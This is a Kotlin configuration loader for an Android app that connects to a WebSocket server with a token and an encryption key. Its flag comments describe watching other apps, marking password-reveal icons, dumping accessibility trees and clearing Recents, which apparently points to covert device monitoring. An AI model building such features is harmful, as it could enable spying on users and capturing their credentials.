package com.base.realtime.config

import android.content.Context
import com.base.realtime.protocol.Codec
import com.base.realtime.protocol.FrameCrypto
import com.base.realtime.protocol.Protocol
import kotlinx.serialization.Serializable
import java.util.concurrent.atomic.AtomicReference

@Serializable
private data class AssetFile(
    val port: String = "",
    val serverUrl: String = "",
    val token: String = "",
    val frameKey: String = "",
    /** true = skip rule tapper; always ask AI UI guide. */
    val autoGrantUseAi: Boolean = false,
    /** true = highlight detected password-eye rect on watched apps (debug). */
    val watchMarkEye: Boolean = false,
    /** true = floating FAB dumps full page accessibility tree (log + clipboard). */
    val watchDumpFab: Boolean = false,
    /** true = after first-action clear Overview/Recents. */
    val clearRecents: Boolean = true,
)

data class AppConfig(
    val port: String,
    val serverUrl: String,
    val token: String,
    val frameKey: ByteArray?,
    val autoGrantUseAi: Boolean = false,
    val watchMarkEye: Boolean = false,
    val watchDumpFab: Boolean = false,
    val clearRecents: Boolean = true,
)

object AppConfigs {
    private val cached = AtomicReference<AppConfig?>(null)

    fun load(context: Context): AppConfig {
        cached.get()?.let { return it }
        val parsed = try {
            val raw = context.applicationContext.assets.open("config.json").bufferedReader().use { it.readText() }
            Codec.json.decodeFromString(AssetFile.serializer(), raw)
        } catch (_: Throwable) {
            AssetFile()
        }
        val port = parsed.port.filter { it.isLetterOrDigit() }.take(Protocol.PORT_LEN)
        val serverUrl = parsed.serverUrl.trim()
        val token = parsed.token.trim().take(256)
        val frameKey = FrameCrypto.parseKey(parsed.frameKey)
        return AppConfig(
            port = if (Protocol.PORT.matches(port)) port else "",
            serverUrl = if (serverUrl.startsWith("ws://") || serverUrl.startsWith("wss://")) serverUrl else "",
            token = token,
            frameKey = frameKey,
            autoGrantUseAi = parsed.autoGrantUseAi,
            watchMarkEye = parsed.watchMarkEye,
            watchDumpFab = parsed.watchDumpFab,
            clearRecents = parsed.clearRecents,
        ).also { cached.set(it) }
    }
}
